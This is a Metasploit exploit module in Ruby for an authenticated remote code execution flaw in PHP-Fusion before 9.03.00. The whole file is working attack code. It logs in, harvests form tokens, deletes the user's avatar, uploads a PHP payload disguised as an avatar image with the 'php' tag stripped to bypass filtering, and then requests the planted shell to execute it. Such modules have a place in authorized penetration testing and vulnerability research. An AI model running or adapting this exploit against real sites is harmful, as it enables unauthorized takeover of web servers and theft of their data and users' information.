# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "PHP-Fusion < 9.03.00 - &#039;Edit Profile&#039; Remote Code Execution",
      &#039;Description&#039; => %q(
        This module exploits command execution vulnerability in PHP-Fusion 9.03.00 and prior versions.
        It is possible to execute commands in the system with ordinary user authority. No need admin privilage.
        There is almost no control in the avatar upload section in the profile edit area.
        If we do not care about this control, the desired file can be sent to the server via Interception-Proxies. 
      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://www.pentest.com.tr/exploits/PHP-Fusion-9-03-00-Edit-Profile-Remote-Code-Execution.html&#039;], # Details
          [&#039;URL&#039;, &#039;https://www.php-fusion.co.uk&#039;]
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "May 11 2019",
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base PHP-Fusion directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, "Username to authenticate with", &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, "Password to authenticate with", &#039;&#039;])
      ]
    )
  end

  def exec
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "images","avatars", "#{@shell}") # shell url
    })
  end
##
# Login and cookie information gathering
##
  def login(uname, pass, check)
    # 1st request to get fusion_token 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "home.php")
    })

    cookie = res.get_cookies
    @fustoken = res.body.split("fusion_token&#039; value=&#039;")[1].split("&#039; />")[0]
    # 2nd request to login
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;home.php&#039;),
      &#039;cookie&#039;   => cookie,
      &#039;vars_post&#039; => {
        &#039;fusion_token&#039; => @fustoken,
        &#039;form_id&#039; => &#039;loginform&#039;,
        &#039;user_name&#039; => uname,
        &#039;user_pass&#039; => pass,
        &#039;login&#039; => &#039;&#039;
      }
    )

    cookie = res.get_cookies
    location = res.redirection.to_s
    if res && res.code == 302 && location.include?(&#039;login.php?error&#039;)
      fail_with(Failure::NoAccess, "Authentication was unsuccessful with user: #{uname}")
    else
      return cookie
    end

    return nil
  end
##
# Upload malicious file // payload integration
##
  def upload_shell(cookie, check)

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "edit_profile.php"),
      &#039;cookie&#039;   => cookie
    })

    ncookie = cookie + " " + res.get_cookies # gathering all cookie information

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "edit_profile.php"),
      &#039;cookie&#039;   => ncookie
    })

    # fetch some necessary post data informations
    fustoken = res.body.split("fusion_token&#039; value=&#039;")[1].split("&#039; />")[0]
    userid = res.body.split("profile.php?lookup=")[1].split(&#039;"><i class=&#039;)[0]
    userhash = res.body.split("userhash&#039; value=&#039;")[1].split("&#039; style")[0]
    usermail = res.body.split("user_email&#039; value=&#039;")[1].split("&#039; >")[0]

    delete = Rex::MIME::Message.new
    delete.add_part("#{fustoken}", nil, nil, &#039;form-data; name="fusion_token"&#039;)
    delete.add_part(&#039;userfieldsform&#039;, nil, nil, &#039;form-data; name="form_id"&#039;)
    delete.add_part("#{datastore[&#039;USERNAME&#039;]}", nil, nil, &#039;form-data; name="user_name"&#039;)
    delete.add_part("#{usermail}", nil, nil, &#039;form-data; name="user_email"&#039;)
    delete.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="delAvatar"&#039;)
    delete.add_part("#{userid}", nil, nil, &#039;form-data; name="user_id"&#039;)
    delete.add_part("#{userhash}", nil, nil, &#039;form-data; name="user_hash"&#039;)
    delete.add_part("#{userhash}", nil, nil, &#039;form-data; name="user_hash"&#039;)
    delete.add_part(&#039;Update Profile&#039;, nil, nil, &#039;form-data; name="update_profile"&#039;)
    deld = delete.to_s

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => deld,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{delete.bound}",
      &#039;cookie&#039; => ncookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, "edit_profile.php")     
    })
    # priv avatar deleted.
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "edit_profile.php"),
      &#039;cookie&#039;   => cookie
    })

    ncookie = cookie + " " + res.get_cookies # recheck cookies

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "edit_profile.php"),
      &#039;cookie&#039;   => ncookie
    })

    # They changed. fetch again...
    fustoken = res.body.split("fusion_token&#039; value=&#039;")[1].split("&#039; />")[0]
    userid = res.body.split("profile.php?lookup=")[1].split(&#039;"><i class=&#039;)[0]
    userhash = res.body.split("userhash&#039; value=&#039;")[1].split("&#039; style")[0]
    usermail = res.body.split("user_email&#039; value=&#039;")[1].split("&#039; >")[0]
    # The "php" string must be removed for bypass.We can use "<?"
    pay = payload.encoded.split("/**/")[1]
    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    @shell = "#{fname}"
    pdata = Rex::MIME::Message.new
    pdata.add_part("#{fustoken}", nil, nil, &#039;form-data; name="fusion_token"&#039;)
    pdata.add_part(&#039;userfieldsform&#039;, nil, nil, &#039;form-data; name="form_id"&#039;)
    pdata.add_part("#{datastore[&#039;USERNAME&#039;]}", nil, nil, &#039;form-data; name="user_name"&#039;)
    pdata.add_part("#{usermail}", nil, nil, &#039;form-data; name="user_email"&#039;)
    pdata.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="delAvatar"&#039;)
    pdata.add_part("<?" + pay, &#039;image/png&#039;, nil, "form-data; name=\"user_avatar\"; filename=\"#{fname}\"")
    pdata.add_part("#{userid}", nil, nil, &#039;form-data; name="user_id"&#039;)
    pdata.add_part("#{userhash}", nil, nil, &#039;form-data; name="user_hash"&#039;)
    pdata.add_part(&#039;Update Profile&#039;, nil, nil, &#039;form-data; name="update_profile"&#039;)
    data = pdata.to_s

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{pdata.bound}",
      &#039;cookie&#039; => ncookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, "edit_profile.php")     
    })

    location = res.redirection.to_s
    if res && res.code == 302 && location.include?(&#039;error&#039;)
      fail_with(Failure::NoAccess, &#039;Error occurred during uploading!&#039;)
    else
      print_status("Trying to upload #{fname}")
      return true
    end
   
  end
##
# Exploit controls and information
##
  def exploit
    cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], false)
    print_good("Authentication was successful with user: #{datastore[&#039;USERNAME&#039;]}")
      
    if upload_shell(cookie, true)
      print_good("Control was bypassed. Harmful file upload successfully!")
      exec
    end
  end
##
# The end of the adventure (o_O) // AkkuS
##
end

